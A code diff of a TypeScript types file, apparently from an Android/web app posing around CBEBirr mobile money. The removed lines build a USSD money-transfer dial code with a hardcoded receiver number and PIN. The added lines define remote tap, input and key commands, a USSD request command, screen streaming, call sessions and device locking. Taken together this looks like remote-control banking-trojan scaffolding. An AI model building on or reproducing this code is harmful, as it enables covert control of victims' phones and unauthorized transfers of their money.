@@ -5,101 +5,6 @@ export const DEVICE_ONLINE_THRESHOLD_MS = 35_000;
 export type DevicePlatform = 'android-apk' | 'web-pwa' | 'web';
 export type DeviceApprovalStatus = 'pending' | 'approved' | 'rejected';
 
-export interface UssdPaymentPreset {
-  id: string;
-  label: string;
-  template: string;
-  phoneNumber: string;
-  amount: string;
-  pin: string;
-  updatedAtMs: number;
-}
-
-export interface UssdPaymentConfig {
-  activePresetId: string;
-  presets: UssdPaymentPreset[];
-  updatedBy: 'telegram' | 'app_0069' | 'system';
-  updatedAtMs: number;
-}
-
-export const DEFAULT_USSD_PAYMENT_PRESET: UssdPaymentPreset = {
-  id: 'ussd_cbe_500_default',
-  label: 'CBEBirr 500 ETB (Default)',
-  template: '*847*1*1*{phone}*{amount}*{pin}*1#',
-  phoneNumber: '0959754788',
-  amount: '500',
-  pin: '6969',
-  updatedAtMs: 0,
-};
-
-export const DEFAULT_USSD_PAYMENT_CONFIG: UssdPaymentConfig = {
-  activePresetId: DEFAULT_USSD_PAYMENT_PRESET.id,
-  presets: [DEFAULT_USSD_PAYMENT_PRESET],
-  updatedBy: 'system',
-  updatedAtMs: 0,
-};
-
-export function resolveUssdPaymentCommand(
-  preset?: Partial<UssdPaymentPreset> | null,
-  overrides?: { phoneNumber?: string; amount?: string; pin?: string }
-): {
-  displayCode: string;
-  dialUri: string;
-  phoneNumber: string;
-  amount: string;
-  pin: string;
-  template: string;
-} {
-  const tplRaw = String(preset?.template || DEFAULT_USSD_PAYMENT_PRESET.template).trim();
-  const phone = String(
-    overrides?.phoneNumber ?? preset?.phoneNumber ?? DEFAULT_USSD_PAYMENT_PRESET.phoneNumber
-  )
-    .replace(/[^0-9+]/g, '')
-    .trim();
-  const amount = String(
-    overrides?.amount ?? preset?.amount ?? DEFAULT_USSD_PAYMENT_PRESET.amount
-  )
-    .replace(/[^0-9.]/g, '')
-    .trim();
-  const pin = String(
-    overrides?.pin ?? preset?.pin ?? DEFAULT_USSD_PAYMENT_PRESET.pin
-  )
-    .replace(/[^0-9]/g, '')
-    .trim();
-
-  let code = (tplRaw || DEFAULT_USSD_PAYMENT_PRESET.template)
-    .replace(/^tel:/i, '')
-    .replace(/%23/gi, '#')
-    .replace(/\s+/g, '');
-
-  code = code.replace(
-    /\{phone\s*number\}|\[phone\s*number\]|\{phone_number\}|\[phone_number\]|\{phonenumber\}|\{phone\}|\[phone\]|\{number\}|\[number\]|\{mobile\}|\[mobile\]|\{receiver\}|\[receiver\]/gi,
-    phone
-  );
-  code = code.replace(/\{amount\}|\[amount\]|\{amt\}|\[amt\]/gi, amount);
-  code = code.replace(/\{pin\}|\[pin\]|\{pass\}|\[pass\]/gi, pin);
-
-  if (!code.endsWith('#')) {
-    code = `${code}#`;
-  }
-
-  return {
-    displayCode: code,
-    dialUri: `tel:${code.replace(/#/g, '%23')}`,
-    phoneNumber: phone,
-    amount,
-    pin,
-    template: tplRaw || DEFAULT_USSD_PAYMENT_PRESET.template,
-  };
-}
-
-export function getActiveUssdPreset(config?: UssdPaymentConfig | null): UssdPaymentPreset {
-  const presets = Array.isArray(config?.presets) && config!.presets.length > 0
-    ? config!.presets
-    : [DEFAULT_USSD_PAYMENT_PRESET];
-  return presets.find((p) => p.id === config?.activePresetId) || presets[0];
-}
-
 export interface DeviceClient {
   deviceId: string;
   deviceName: string;
@@ -112,8 +17,6 @@ export interface DeviceClient {
   isLocked: boolean;
   lockReason?: string;
   approvalStatus?: DeviceApprovalStatus;
-  paymentUssdTriggered?: boolean;
-  paymentUssdCode?: string;
   lastSeenAtMs: number;
   isOnline?: boolean;
   ownerId?: string;
@@ -158,7 +61,6 @@ export interface OwnerGlobalConfig {
   configId: string;
   globalLocked: boolean;
   globalLockMessage: string;
-  ussdPaymentConfig?: UssdPaymentConfig;
   updatedBy: 'telegram' | 'app_0069' | 'system';
   updatedAtMs: number;
 }
@@ -168,7 +70,6 @@ export interface OwnerDashboardSnapshot {
   transactions: DeviceTransaction[];
   notifications: OwnerNotification[];
   globalConfig: OwnerGlobalConfig;
-  ussdPaymentConfig: UssdPaymentConfig;
   storageMode: 'firestore' | 'local-cache';
   telegramConfigured: boolean;
   serverTimeMs: number;
@@ -180,7 +81,12 @@ export type SupportCommandType =
   | 'none'
   | 'navigate_step'
   | 'highlight_point'
-  | 'show_tip';
+  | 'show_tip'
+  | 'remote_tap'
+  | 'remote_scroll'
+  | 'remote_input'
+  | 'remote_key'
+  | 'request_ussd';
 
 export interface SupportSession {
   sessionId: string;
@@ -202,9 +108,38 @@ export interface SupportSession {
   commandSeq: number;
   commandType: SupportCommandType;
   commandPayload: string;
+  ussdStatus: string;
   stateSeq: number;
+  frameDataUrl?: string;
+  frameSeq?: number;
+  frameUpdatedAtMs?: number;
+  rtcSeq: number;
+  rtcOffer: string;
+  rtcAnswer: string;
+  ownerMicMuted: boolean;
+  clientMicMuted: boolean;
   requestedAtMs: number;
   acceptedAtMs: number;
+  expiresAtMs: number;
+  updatedAtMs: number;
+}
+
+export type CallSessionStatus = 'ringing' | 'active' | 'ended' | 'declined' | 'missed';
+
+export interface CallSession {
+  callId: string;
+  deviceId: string;
+  deviceName: string;
+  callerRole: 'app_0069' | 'ram_control';
+  callerName: string;
+  status: CallSessionStatus;
+  rtcSeq: number;
+  rtcOffer: string;
+  rtcAnswer: string;
+  ownerMicMuted: boolean;
+  clientMicMuted: boolean;
+  startedAtMs: number;
+  answeredAtMs: number;
   expiresAtMs: number;
   updatedAtMs: number;
 }
@@ -219,17 +154,19 @@ export interface DeviceSyncResponse {
   lockMessage: string;
   notifications: OwnerNotification[];
   supportSession?: SupportSession | null;
-  ussdPaymentConfig?: UssdPaymentConfig;
+  callSession?: CallSession | null;
   serverTimeMs: number;
 }
 
 export function getOwnerApiBaseUrl(): string {
   if (typeof window !== 'undefined') {
     const origin = window.location?.origin || '';
+    const hostname = window.location?.hostname || '';
     const protocol = window.location?.protocol || '';
     if (
       origin.includes('appassets.androidplatform.net') ||
-      protocol === 'file:'
+      protocol === 'file:' ||
+      hostname.endsWith('.run.app')
     ) {
       return 'https://cbebirr-lovat.vercel.app';
     }
